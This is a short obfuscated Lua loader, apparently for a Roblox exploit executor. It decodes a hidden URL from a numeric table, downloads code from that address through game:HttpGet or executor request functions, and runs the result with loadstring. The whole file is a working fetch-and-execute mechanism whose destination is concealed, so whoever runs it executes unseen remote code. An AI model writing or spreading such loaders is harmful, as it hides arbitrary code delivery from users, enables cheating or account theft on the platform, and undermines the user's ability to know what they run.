local function _d(t,k)local r={}for i=1,#t do r[i]=string.char(((t[i]-k-(i*19)-41)%256+256)%256)end return table.concat(r)end
local _u=_d({45,76,95,110,132,94,102,121,208,222,228,1,14,32,48,85,93,106,138,143,179,184,149,234,238,25,31,46,59,94,110,129,83,175,186,208,220,233,9,29,235,52,72,108,56,146,97,113,183},137)
local _f=(loadstring or load)
local _ok,_s=pcall(function()return game:HttpGet(_u,true)end)
if not _ok or type(_s)~="string" or #_s<8 then local _r=(getgenv and (getgenv().http_request or getgenv().request))or http_request or request or (syn and syn.request) if _r then local _x=_r({Url=_u,Method="GET"}) _s=_x and (_x.Body or _x.body) end end
if _f and type(_s)=="string" and #_s>0 then return _f(_s)() end
